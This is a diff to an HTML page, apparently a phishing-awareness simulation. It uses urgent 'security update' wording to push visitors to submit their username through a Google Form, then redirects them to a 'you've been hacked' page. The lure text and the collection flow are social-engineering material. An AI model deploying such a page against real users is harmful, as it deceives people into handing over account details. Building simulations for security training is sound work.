@@ -8,31 +8,15 @@
   <p>Please verify your username to view this critical security update regarding your account.</p>
   <p>This announcement will only be available for a short time. Please enter your username immediately.</p>
 
-  <iframe
-    src="https://docs.google.com/forms/d/e/1FAIpQLSefGtcLuAZIhVcZ4Kr6EaVoooA-jFbeDqvlecpB8capioBTFw/viewform?embedded=true"
-    width="640"
-    height="669"
-    frameborder="0"
-    marginheight="0"
-    marginwidth="0"
-    id="google-form"
-  >Loading…</iframe>
+  <a href="https://docs.google.com/forms/d/e/1FAIpQLSefGtcLuAZIhVcZ4Kr6EaVoooA-jFbeDqvlecpB8capioBTFw/viewform?embedded=true" target="_blank">
+    Click here to view the announcement
+  </a>
 
   <script>
-    var iframe = document.getElementById('google-form');
-
-    // Listen for changes in the iframe's content
-    iframe.addEventListener('load', function() {
-      var initialContent = iframe.contentDocument.body.innerHTML;
-
-      setInterval(function() {
-        var currentContent = iframe.contentDocument.body.innerHTML;
-        if (currentContent !== initialContent) {
-          // The form has likely been submitted, redirect
-          window.location.replace('youve-been-hacked.html');
-        }
-      }, 1000); // Check every second
-    });
+    // Redirect to the "You've been hacked" page after a delay (e.g., 30 seconds)
+    setTimeout(function() {
+      window.location.href = 'youve-been-hacked.html';
+    }, 30000); // 30000 milliseconds = 30 seconds
   </script>
 </body>
 </html>
